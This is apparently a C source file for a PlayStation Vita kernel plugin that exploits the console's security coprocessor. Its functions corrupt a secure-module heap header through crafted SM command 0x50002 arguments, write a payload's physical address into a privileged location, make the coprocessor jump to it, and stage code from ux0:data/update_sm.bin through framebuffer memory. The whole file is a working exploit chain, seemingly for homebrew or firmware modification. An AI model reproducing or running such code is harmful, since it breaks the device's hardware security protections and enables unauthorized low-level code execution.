#include "tai_compat.h"
#include "dsll.h"

#define PAYLOAD get_xx_71
#define LOG_LOC "ux0:data/decsecldr-lite.log"

int ctx = -1;
int dclog = 1;
uint32_t cpybuf[64/4];
cmd_0x50002_t cargs;
SceSblSmCommPair stop_res;
static int (* load_ussm)() = NULL;

static int woold(int mode) {
	int ret = 0;
	char *src = "ux0:data/update_sm.bin";
	SceKernelAllocMemBlockKernelOpt optp;
	void *fb_addr = NULL;
	int uid, fd;
	optp.size = 0x58;
	optp.attr = 2;
	optp.paddr = 0x1C000000;
	uid = ksceKernelAllocMemBlock("SceDisplay", 0x6020D006, 0x200000, &optp);
	ksceKernelGetMemBlockBase(uid, (void**)&fb_addr);
	ksceKernelCpuDcacheAndL2WritebackInvalidateRange(fb_addr, 0x1FE000);
	if (mode == 0) {
		memset(fb_addr, 0, 0x1FE000);
	} else if (mode == 2) {
		SceIoStat stat;
		int stat_ret = ksceIoGetstat(src, &stat);
		if(stat_ret < 0){
			LOG("woold_fopread_err\n");
			ret = 2;
		} else {
			fd = ksceIoOpen(src, SCE_O_RDONLY, 0);
			ksceIoLseek(fd, 0x1000, 0);
			ksceIoRead(fd, fb_addr, (stat.st_size - 0x1000));
			ksceIoClose(fd);
		}
	}
	ksceKernelCpuDcacheAndL2WritebackInvalidateRange(fb_addr, 0x1FE000);
	ksceKernelFreeMemBlock(uid);
	return ret;
}

static int nzero32(uint32_t addr) {
  LOG("zero 0x%lX for 0x%X... ", addr, ctx);
  int ret = 0, sm_ret = 0;
  memset(&cargs, 0, sizeof(cargs));
  cargs.use_lv2_mode_0 = cargs.use_lv2_mode_1 = 0;
  cargs.list_count = 3;
  cargs.total_count = 1;
  cargs.list.lv1[0].addr = cargs.list.lv1[1].addr = 0x50000000;
  cargs.list.lv1[0].length = cargs.list.lv1[1].length = 0x10;
  cargs.list.lv1[2].addr = 0;
  cargs.list.lv1[2].length = addr - offsetof(heap_hdr_t, next);
  LOG("calling 0x50002 ");
  ret = ksceSblSmCommCallFunc(ctx, 0x50002, &sm_ret, &cargs, sizeof(cargs));
  if (sm_ret < 0) {
	LOG("SM ret=0x%X\n", sm_ret);
    return sm_ret;
  }
  LOG("end ret=0x%X\n", ret);
  return ret;
}

static void init(void) {
	int ret = -1, sm_ret = -1;
	tai_module_info_t info;			
	info.size = sizeof(info);		
	LOG("getting mod info for SceSblUpdateMgr... ");
	if (taiGetModuleInfoForKernel(KERNEL_PID, "SceSblUpdateMgr", &info) >= 0) {
		LOG("gud\n");
		module_get_offset(KERNEL_PID, info.modid, 0, 0x51a9, &load_ussm); 
		LOG("calling sm load... ");
		ret = load_ussm(0, &ctx, 0);
		LOG("ctx 0x%X ", ctx);
		if (ret == 0) {
			LOG("gud\n");
			nzero32(0x0080bd7c);
		} else {
			LOG("NG; ret=0x%X\n", ret);
		}
	} else {
		LOG("NG\n");
	}
}

void cmep_jump(uint32_t paddr) {
	LOG("jmping to: 0x%lX, ctx: 0x%X... ", paddr, ctx);
    int ret = -1, sm_ret = -1;
	uint32_t req[16];
	memset(&req, 0, sizeof(req));
	req[0] = paddr;
    ret = ksceSblSmCommCallFunc(ctx, 0xd0002, &sm_ret, &req, sizeof(req));
    LOG("ret: 0x%X, SM: 0x%X\n", ret, sm_ret);
}

void cmep_cpypriv(uint32_t val) {
	LOG("cpying 0x%lX to: 0x818228, ctx: 0x%X... ", val, ctx);
    int ret = -1, sm_ret = -1;
	memset(&cpybuf, 0, sizeof(cpybuf));
	cpybuf[0] = 1;
	cpybuf[1] = 1;
	cpybuf[2] = val;
	cpybuf[3] = val;
	cpybuf[4] = val;
    ret = ksceSblSmCommCallFunc(ctx, 0xd0002, &sm_ret, &cpybuf, sizeof(cpybuf));
    LOG("ret: 0x%X, SM: 0x%X\n", ret, sm_ret);
}

static void reloadsm(void) {
	int ret = -1, sm_ret = -1;
	ctx = -1;
	LOG("sm reload started... ");
	ret = load_ussm(0, &ctx, 0);
	LOG("ctx 0x%X ", ctx);
	if (ret == 0) {
		LOG("gud\n");
		ksceSblSmCommStopSm(ctx, &stop_res);
	} else {
		LOG("NG; ret=0x%X\n", ret);
	}
}

void _start() __attribute__ ((weak, alias ("module_start")));
int module_start(SceSize argc, const void *args)
{
	LOG_START("decsecldr started!\n");
	LOG("rev: LITE_CUSTOM-MODORU_3.72\n");
	int sysroot = ksceKernelGetSysbase();
	LOG("fw: 0x%lX\n", *(uint32_t *)(*(int *)(sysroot + 0x6c) + 4));
	woold(0);
	init();
	uintptr_t buf_paddr;
	ksceKernelGetPaddr(PAYLOAD, &buf_paddr);
	LOG("buf_paddr : 0x%X\n", buf_paddr);
	cmep_cpypriv((uint32_t)buf_paddr);
	cmep_jump(5414);
	ksceSblSmCommStopSm(ctx, &stop_res);
	if (woold(2) != 0)
		return SCE_KERNEL_START_FAILED;
	reloadsm();
	LOG("not-moth finished!\n");
	return SCE_KERNEL_START_SUCCESS;
}

int module_stop(SceSize argc, const void *args)
{
	return SCE_KERNEL_STOP_SUCCESS;
}
